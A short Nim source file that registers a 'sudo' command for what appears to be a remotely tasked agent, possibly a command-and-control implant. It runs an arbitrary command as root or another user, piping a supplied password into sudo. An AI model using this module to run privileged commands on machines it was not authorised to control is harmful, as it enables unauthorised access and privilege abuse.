import std/[json, osproc, os, strutils, envvars]
import core/types
import commands/registry

proc sudoExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  when defined(windows):
    return TaskResult(
      output:    "sudo is not available on Windows — use runas instead.",
      status:    "error",
      completed: true)
  else:
    let command  = params{"command"}.getStr("")
    let user     = params{"user"}.getStr("root")
    let password = params{"password"}.getStr("")

    if command.len == 0:
      return TaskResult(output: "Error: command is required", status: "error", completed: true)

    let sudoBin = findExe("sudo")
    if sudoBin.len == 0:
      return TaskResult(output: "Error: sudo not found in PATH", status: "error", completed: true)

    var cmd: string
    if password.len > 0:
      cmd = "echo " & quoteShell(password) & " | " & quoteShell(sudoBin) & " -S"
    else:
      cmd = quoteShell(sudoBin)

    if user != "root":
      cmd &= " -u " & quoteShell(user)

    cmd &= " sh -c " & quoteShell(command)

    try:
      let (output, code) = execCmdEx(cmd, options = {poStdErrToStdOut},
                                     workingDir = state.cwd)
      let status = if code == 0: "success" else: "error"
      return TaskResult(output: output, status: status, completed: true)
    except Exception as e:
      return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initSudo*() =
  register("sudo", sudoExecute)
